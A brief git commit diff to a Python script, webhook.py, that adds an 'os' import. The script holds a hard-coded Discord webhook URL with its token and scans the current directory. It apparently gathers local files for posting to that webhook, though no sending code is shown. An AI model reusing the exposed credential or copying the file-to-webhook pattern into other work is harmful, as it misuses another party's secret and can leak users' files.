5478c481ecc110befd03deb429d16c822d32a259
MincoMK <mail@drchi.co.kr>
2023-10-27 19:32:18 +0900

    s

--- webhook.py
+++ webhook.py
@@ -1,4 +1,4 @@
-import requests
+import requests, os
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1167333653504851978/2QW80l5Nf4j3t_G56jF1EzH8nVUY0dDtK4y0pDemiQmXt7Z3-64aW2rwVi1wmPyd6HnY"
 files = os.scandir('.')
